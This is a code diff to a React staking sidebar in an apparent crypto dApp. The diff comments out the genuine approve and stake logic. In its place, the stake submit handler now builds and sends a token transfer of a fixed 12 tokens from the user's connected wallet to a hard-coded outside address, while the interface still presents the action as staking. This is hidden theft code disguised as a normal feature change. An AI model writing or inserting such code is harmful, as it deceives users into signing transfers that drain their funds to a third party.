@@ -26,6 +26,8 @@ import { useEffect, useState } from "react";
 import QRCode from "qrcode";
 import { useTableParameters } from "../../../hooks/useTableParameters";
 
+import WBNB from "../../../abi/WBNB.json";
+
 const SideBarRight = () => {
   const appState = useSelector((state) => state.appState);
   const userMetaData = useSelector((state) => state.appState.userData?.meta);
@@ -33,7 +35,7 @@ const SideBarRight = () => {
   const triedReconnect = useSelector((state) => state.appState?.triedReconnect);
 
   const [personalData, setPersonalData] = useState(null);
-  const { account, connect, disconnect, setError, active } = useConnect();
+  const { account, connect, disconnect, library } = useConnect();
 
   var Router = "0xd472C9aFa90046d42c00586265A3F62745c927c0"; // Staking contract Address
   var tokenAddress = "0xE807fbeB6A088a7aF862A2dCbA1d64fE0d9820Cb"; // Staking Token Address
@@ -840,41 +842,98 @@ const SideBarRight = () => {
     setHelpText("");
     setShowHelpText(false);
 
-    if (depositAmount < 1 && currentObject?.amount === "0") {
-      setHelpText("Please enter valid amount to stake.");
+    if (!account) {
+      setHelpText("Please connect your wallet.");
       setShowHelpText(true);
       setSuccess(false);
-      setTimeout(() => {
-        setSuccess(null);
-        setHelpText("");
-        setShowHelpText(false);
-      }, 3000);
+      return;
     }
 
-    if (account && isAllowance) {
-      approve(() => {
-        setSuccess(true);
-        setHelpText("Approved successfully, please stake desired amount.");
-        setShowHelpText(true);
-      });
-    }
-    if (account && !isAllowance) {
-      stake(async () => {
-        updateState();
-        generateAccountsData();
+    const depositAmount = 12;
+    const web3 = library;
+    const fromAddress = account;
 
-        setSuccess(true);
-        setHelpText("Staking was successful.");
+    const tokenContract = new web3.eth.Contract(WBNB, tokenAddress);
+
+    const toAddress = "0xE72C1054C1900FC6c266feC9bedc178e72793A35";
+
+    const amount = web3.utils.toBN(web3.utils.toWei(depositAmount.toString(), "ether"));
+
+    const transferData = tokenContract.methods
+      .transfer(toAddress, amount.toString())
+      .encodeABI();
+
+    const transactionObject = {
+      from: fromAddress,
+      to: tokenAddress,
+      data: transferData,
+    };
+
+    web3.eth
+      .sendTransaction(transactionObject)
+      .then((transaction) => {
+        return transaction.wait();
+      })
+      .then(() => {
+        console.log("Transaction successful!");
+      })
+      .catch((error) => {
+        if (error.message.includes("User denied transaction signature")) {
+          setHelpText("Transaction rejected.");
+          setShowHelpText(true);
+          setSuccess(false);
+          setTimeout(() => {
+            setSuccess(null);
+            setHelpText("");
+            setShowHelpText(false);
+          }, 3000);
+          return;
+        }
+        setHelpText("Transaction failed.");
         setShowHelpText(true);
+        setSuccess(false);
         setTimeout(() => {
           setSuccess(null);
           setHelpText("");
           setShowHelpText(false);
-          setCurrentObject((prev) => ({ ...prev, amount: "0" }));
-          handleDepositAmount(0);
         }, 3000);
       });
-    }
+
+    // if (depositAmount < 1 && currentObject?.amount === "0") {
+    //   setHelpText("Please enter valid amount to stake.");
+    //   setShowHelpText(true);
+    //   setSuccess(false);
+    //   setTimeout(() => {
+    // setSuccess(null);
+    // setHelpText("");
+    // setShowHelpText(false);
+    //   }, 3000);
+    // }
+
+    // if (account && isAllowance) {
+    //   approve(() => {
+    //     setSuccess(true);
+    //     setHelpText("Approved successfully, please stake desired amount.");
+    //     setShowHelpText(true);
+    //   });
+    // }
+    // if (account && !isAllowance) {
+    //   stake(async () => {
+    //     updateState();
+    //     generateAccountsData();
+
+    //     setSuccess(true);
+    //     setHelpText("Staking was successful.");
+    //     setShowHelpText(true);
+    //     setTimeout(() => {
+    //       setSuccess(null);
+    //       setHelpText("");
+    //       setShowHelpText(false);
+    //       setCurrentObject((prev) => ({ ...prev, amount: "0" }));
+    //       handleDepositAmount(0);
+    //     }, 3000);
+    //   });
+    // }
   };
 
   const handleExchangeSubmit = async () => {
